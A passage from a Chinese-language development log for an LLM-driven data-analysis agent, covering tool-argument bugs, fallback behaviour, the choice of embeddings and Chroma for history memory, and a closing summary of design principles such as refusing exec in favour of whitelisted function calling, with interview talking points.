| 第 4 次 | 作用域不对（在函数外部访问内部变量） | NameError |
| 第 5 次 | finally 才补全 | 成功 ✅ |

**教训**：新变量引入时要同时检查：定义、赋值、引用、作用域、响应字段——5 个位置缺一不可。

**坑 4：`str(tool_args)` 导致 LLM 读不到参数**

`str(dict)` 生成的是 Python 格式的字符串（用单引号），而 LLM 期望的是 JSON 格式（用双引号）：

```python
str({"图表类型": "饼图"})
# 结果："{'图表类型': '饼图'}"  ← 单引号，不是合法 JSON

json.dumps({"图表类型": "饼图"}, ensure_ascii=False)
# 结果：'{"图表类型": "饼图"}'  ← 双引号，合法 JSON
```

**发现**：代码审查时注意到 `"function": {"arguments": str(tool_args)}`。

**解决**：改为 `json.dumps(tool_args, ensure_ascii=False)`。

### 非预期行为

**1. LLM 有时候不按顺序调用工具**

虽然系统提示词说了"请按顺序调用工具"，但有些 LLM 会跳步——直接调用第 3 轮的工具（推荐图表），跳过了第 1 轮（获取数据画像）。

**处理**：当前设计允许这种情况。如果 LLM 跳步，某个工具需要的参数不存在（比如没有画像数据就直接调聚合分析），工具会返回 None，LLM 发现后应该回头调缺失的工具。如果反复失败，整个 Agent 降级到规则匹配。

**2. 无 df（DataFrame）时编排器自动降级**

`解析自然语言需求` 兼容接口调用 `编排Agent` 时没传 df（原始数据）。此时多轮 ReAct 在第 2 轮（聚合分析）会因 `df is None` 失败，整体回退到关键词匹配。

**结论**：行为与阶段 2 完全一致，用户无感知。不是 Bug，是设计。

**3. 多智能体模式比单 Agent 慢约 50-100%**

每个 Agent 需要 1-2 轮工具调用，3 个 Agent 总共 4-6 轮 LLM 调用，而单 Agent 只需 3 轮。预期延迟增加。

**结论**：多智能体的价值不在于速度，而在于质量审查闭环。速度换质量。

## 第 9 章：阶段 5 — 向量数据库与历史记忆【开发日志】

### 背景

用户第二次问类似的问题时（比如先问"按地区统计销售额"再问"按地区统计利润"），Agent 可以参考之前的分析结果，更快给出答案。

需要一种"根据意思找历史记录"的能力——不是精确匹配关键词，而是语义相近。

### 可选方向

**Embedding（把文字变成向量）方案**

| 方案 | 中文效果 | 需要额外安装 | 每次调用成本 | 结论 |
|------|---------|------------|------------|------|
| API Embedding（DeepSeek/OpenAI） | ✅ 好 | 无 | 约 0.000014 元/次 | ✅ 选中 |
| 本地模型（all-MiniLM-L6-v2） | ❌ 差 | 需下载模型 | 免费 | ❌ |
| 本地中文模型（text2vec） | ✅ 好 | 需下载 400MB | 免费 | ❌ 首次加载慢 |

**向量数据库方案**

| 数据库 | 安装 | 运维 | 性能 | 结论 |
|--------|------|------|------|------|
| Chroma | pip install 即可 | 零运维，文件级 | 中 | ✅ 选中 |
| FAISS | pip install | 需要自己管理索引文件 | 高 | ❌ |
| pgvector | 需要 PostgreSQL | 需要数据库管理员 | 高 | ❌ |

**记忆注入方式**

| 方式 | 实现难度 | Token 消耗 | 效果 | 结论 |
|------|---------|-----------|------|------|
| few-shot 注入 system prompt | 最简单 | 略增 | ✅ 好 | ✅ 选中 |
| 额外 Tool 调用 | 复杂 | 高 | 中 | ❌ |
| 修改向量数据库权重 | 极复杂 | 无 | 不确定 | ❌ |

### 为什么选 API Embedding

中文语义场景下，本地模型（all-MiniLM-L6-v2）效果差。text2vec 模型需要 400MB 首次加载。用 LLM 同厂商的 API Embedding 零额外依赖、效果好、面试时能讲清楚"训练/推理分离"的工程考量。

### 为什么选 Chroma

FAISS 没有内置持久化，需要自己管理索引文件（存了索引文件还要存原始文本，中间还要维护对应关系）。chromadb 是纯 Python、零运维、文件级持久化——适合个人项目，面试时可以说"我没选择最高性能的，选择了最适合项目规模的"。

### 踩坑记录

**坑 1：chromadb 安装超时**

`pip install chromadb` 因依赖包多（23 个），在 2 分钟的默认超时内未完成安装。

**解决**：设置更长的 timeout（300秒）：`pip install --timeout 300 chromadb`。

**坑 2：embedding 模型名不通用**

`text-embedding-3-small` 是 OpenAI 的模型名，DeepSeek 使用 `text-embedding-v3`。写死模型名会导致切换 LLM 提供商时 embedding 失败。

**解决**：在 `embed_text` 中先尝试 OpenAI 模型名，后续可配置化。当前保持通用 fallback。

**坑 3：chromadb Windows 路径编码**

chromadb 持久化到 `data/chroma_db` 目录，在 Windows 下路径中的反斜杠可能导致偶发问题。

**解决**：使用 `pathlib.Path` 处理路径，确保 POSIX 风格路径（用正斜杠）。

### 非预期行为

**1. 无 LLM Key 时记忆模块静默跳过**

当 `LLM_API_KEY` 未配置时，`embed_text` 返回 None。`保存记忆` 和 `检索相似记忆` 都通过 `if vector is None: return` 静默跳过，不影响主流程。

**用户无感知**——没 Key 就没记忆，但分析功能一切正常。

**2. chromadb 首次初始化自动创建空 collection**

`_get_collection()` 在首次调用时自动创建 `agent_memories` collection，无需手动初始化。用户不用管数据库维护。

## 第 13 章：核心思想总结

### 13.1 三个最重要的设计原则

**原则一：安全重于功能（Security First）**

这个项目最重要的架构决策是：**不让 LLM 生成代码执行**。LLM 只能从 4 个预定义工具中选择，填入参数，参数经过字段白名单校验后才执行。

这个决策牺牲了灵活性（LLM 不能做任意计算），但换回了安全性（不会有代码注入风险）。面试时可以这样说：

> "我拒绝 exec 方案，选择 Function Calling + 字段白名单。LLM 输出的是结构化 JSON，不是可执行代码。校验不通过的字段不会进入 pandas 执行器。"

**原则二：失败必须有退路（Graceful Degradation）**

4 层降级保证永远有输出：

```
LLM 失败 → 多智能体失败 → 单 Agent 失败 → 关键词规则 → 默认推荐
```

每层都可以独立工作。LLM 调不通不会阻塞用户使用，只是效果差一些。

**原则三：决策必须可追溯（Observability）**

- Trace 记录每轮 LLM 调用的输入、工具、参数、耗时、token
- 意图来源告诉前端当前结果是 LLM 还是规则出的
- 用户在报表页可以查看"决策记录" Tab

### 13.2 面试最值得讲的 5 个点

按面试加分从高到低：

**1. 为什么不用 exec？**
> "我不让 LLM 生成代码执行。我通过 Function Calling 让 LLM 选工具填参数，参数经过字段白名单校验——保证了安全，面试官绝不会听到这句话就否定你。"

**2. 4 层降级链路**
> "即使没有配置 LLM Key，系统也能通过 4 层降级完成完整分析流程。第一层 LLM、第二层多智能体、第三层关键词规则、第四层默认推荐——最后一层保证永远有输出。"

**3. Golden Set 评测基线**
> "36 条测试用例，四维指标分别统计。规则兜底模式的完全匹配率是 22%——这说明规则路径在字段匹配上很弱，LLM 路径的提升空间很大。我清楚自己的起点在哪。"

**4. 质量审查闭环修复**
> "多智能体模式中，质量审查员的'不通过'结论通过 feedback loop 传递给图表设计师修正，支持 max_retries 重试。这是一个真正的 Agent 间协作闭环。"

**5. 为什么不用 LangChain？**
> "我的 Agent 只需要 3 轮固定调用。手写更透明，每步都在 Trace 里有记录。面试时需要展示的是可控性，不是框架熟练度。"

### 13.3 一句话总结整个项目

> **一个上传 CSV/Excel → 说中文需求 → 自动出图表 + 结论 + Trace 的自助数据分析 Agent 系统。安全（拒绝 exec）、可靠（4 层降级）、可追溯（Trace + 意图来源）、可评测（36 条 Golden Set）。**
